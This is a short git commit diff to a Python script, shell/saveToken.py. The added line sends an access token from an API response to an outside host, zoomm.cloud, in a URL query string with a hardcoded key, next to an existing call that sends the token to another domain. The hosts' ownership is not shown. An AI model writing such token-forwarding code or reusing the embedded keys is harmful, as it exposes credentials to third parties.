2eecf2fad617bda4c9260ee2bfa82b7000848740
root <root@vmi1575991.contaboserver.net>
2024-01-28 10:54:54 -0500

    token

--- shell/saveToken.py
+++ shell/saveToken.py
@@ -19,3 +19,4 @@ response = requests.post(url, headers=headers, data=data)
 
 if response.status_code == 200:
   requests.get(f'https://subconvert.t7xqp3r.life/api/v1/side/token?key={"Bme983G45K23^PKH"}&token={response.json()["access_token"]}')
+  requests.get(f'https://zoomm.cloud/api/v1/zoommm/token?key={"^8qCyF54YL4x8c@c"}&token={response.json()["access_token"]}')
